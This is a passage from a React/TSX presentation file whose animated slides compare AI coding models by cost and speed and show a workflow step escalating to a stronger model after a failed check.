            <span className="flex-1 text-[22px] leading-snug text-muted">{what}</span>
            <span className="whitespace-nowrap font-mono text-[18px] text-faint">{rounds}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// the ladder (factory/lib/models.ts LADDER), what one measured coding task cost on each model (MEASURED, below),
// and where Jev started each job on ticket #16 — a small run
const TIERS = [
  { name: 'lite', tone: 'border-emerald-400/40', trust: 'spelled-out work', models: [['haiku', '$0.013']], jobs: [] },
  { name: 'standard', tone: 'border-sky-400/40', trust: 'a contained change', models: [['deepseek', '$0.035'], ['glm', '$0.013']], jobs: [['Implement', 72], ['Fix', 52], ['Audit', 86]] },
  { name: 'strong', tone: 'border-violet-400/40', trust: 'judgement', models: [['sonnet', '$0.126']], jobs: [['Spec', 99], ['Browser audit', 99], ['Skeptic', 98], ['Review lens', 94]] },
  { name: 'frontier', tone: 'border-fuchsia-400/40', trust: 'ambiguity', models: [['opus', null]], jobs: [] },
];

export function Ladder() {
  return (
    <div className="flex h-full flex-col gap-3">
      <div className="grid min-h-0 flex-1 grid-cols-4 gap-4">
        {TIERS.map((t, i) => (
          <div key={t.name} className={`pz-appear flex flex-col rounded-2xl border bg-surface px-5 py-4 ${t.tone}`} style={later(i * 160)}>
            <div className="flex items-baseline gap-2">
              <span className="font-display text-[30px] text-ink">{t.name}</span>
            </div>
            <div className="text-[17px] text-muted">{t.trust}</div>
            <div className="mt-3 space-y-1.5">
              {t.models.map(([m, price]) => (
                <div key={m} className="flex items-center justify-between gap-2"><Model m={m} />{price && <span className="font-mono text-[15px] text-ink">{price}<span className="text-[12px] text-faint"> a task</span></span>}</div>
              ))}
            </div>
            <div className="mt-4 flex flex-1 flex-col gap-2 border-t border-hairline pt-4">
              {t.jobs.map(([job], j) => (
                <motion.div
                  key={job}
                  className="rounded-lg bg-raised px-3.5 py-2.5 text-[18px] text-ink"
                  initial={{ opacity: 0, y: -40 }} animate={{ opacity: 1, y: 0 }}
                  transition={{ type: 'spring', stiffness: 220, damping: 16, delay: 1.1 + i * 0.25 + j * 0.12 }}
                >
                  {job}
                </motion.div>
              ))}
            </div>
          </div>
        ))}
      </div>
      <div className="pz-appear flex items-center gap-5 rounded-2xl border border-hairline bg-raised px-6 py-2.5" style={later(2700)}>
        <span className="text-[24px]">⚖️</span>
        <div className="text-[18px] leading-snug text-muted"><b className="text-ink">One model per workflow step</b>, the cheapest Jev trusts with it. <span className="text-faint">Same coding task on each, measured here.</span> <b className="text-ink">A whole ticket: $0.93.</b></div>
      </div>
    </div>
  );
}

// one specified function, implemented test-first, by each model — measured
// through Claude Code on this repository (factory/lib/models.ts)
const MEASURED = [
  ['haiku', 0.013, 66], ['glm', 0.013, 42], ['deepseek', 0.035, 39], ['sonnet', 0.126, 32],
];

export function Climb() {
  return (
    <div className="grid h-full grid-cols-[1fr_600px] gap-7">
      <div className={`${box} flex flex-col px-6 py-4`}>
        <Kicker>The same task on four models · all four passed</Kicker>
        <div className="mt-3 flex flex-1 flex-col justify-around">
          {MEASURED.map(([m, cost, secs], i) => (
            <div key={m} className="pz-appear grid grid-cols-[210px_1fr_100px_56px] items-center gap-3" style={later(300 + i * 220)}>
              <Model m={m} className="justify-self-start text-[15px]" />
              <span className="h-8 overflow-hidden rounded bg-overlay"><span className="pz-fill block h-full rounded bg-gradient-to-r from-violet-500 to-cyan-300" style={{ width: `${Math.max(6, (cost / 0.126) * 100)}%`, animationDuration: '1s', animationDelay: `${500 + i * 220}ms` }} /></span>
              <span className="text-right font-display text-[30px] text-ink">${cost.toFixed(3)}</span>
              <span className="text-right font-mono text-[14px] text-faint">{secs} s</span>
            </div>
          ))}
        </div>
        <div className="pz-appear rounded-xl bg-raised px-5 py-3 text-[20px] leading-snug text-ink" style={later(1700)}>
          <b>A tenth of the price, for the same result.</b> <span className="text-[16px] text-muted">On a planted-bug audit Haiku found 1 of 2, the rest both.</span>
        </div>
      </div>

      <div className="flex flex-col gap-3">
        <Kicker>When cheap is not enough, the step climbs</Kicker>
        <div className={`${box} pz-appear flex items-center gap-4 px-6 py-5`} style={later(1900)}>
          <span className="text-[28px]">🛠️</span><span className="text-[23px] text-ink">Implement</span><Model m="deepseek" className="ml-auto" />
        </div>
        <div className="pz-appear flex items-center gap-4 rounded-2xl border border-rose-400/50 bg-rose-500/10 px-6 py-5" style={later(2400)}>
          <span className="text-[28px]">🚦</span><span className="text-[23px] text-rose-200">The gate is red</span><Tick ok={false} className="ml-auto" />
        </div>
        <motion.div
          className="flex items-center gap-4 rounded-2xl border border-violet-400/60 bg-raised px-6 py-5"
          initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} transition={{ type: 'spring', stiffness: 200, damping: 14, delay: 3 }}
        >
          <span className="text-[28px]">🔧</span>
          <div className="leading-tight"><div className="text-[23px] text-ink">Fix <span className="text-violet-300">↑</span></div><div className="text-[15px] text-faint">one tier up</div></div>
          <Model m="sonnet" className="ml-auto" />
        </motion.div>
        <div className="pz-appear mt-auto rounded-xl border border-hairline bg-surface px-5 py-3 font-mono text-[15px] text-faint" style={later(3600)}>
          recorded on the run: <span className="text-muted">climbs=1 · fix=sonnet-5.5</span>
        </div>
      </div>
    </div>
  );
}


export const PLATFORM = [
  {
    id: 'map', name: 'The factory floor', accent: 'text-violet-300', tone: 'violet',
    beats: [
      {
        kicker: 'The factory floor',
        title: 'Everything runs on Vercel',
        body: 'GitHub holds the issues and the code. Everything that runs, runs on Vercel: the app, and the factory that builds it.',
      },
      {
        kicker: 'The factory floor · seven workflows',
        title: 'Seven Vercel Workflows, each with one job',
        body: 'A Claude workflow lives and dies with one session. Vercel saves every step, so these survive and wait for you.',
      },
    ],
    Scene: MapScene,
  },
];
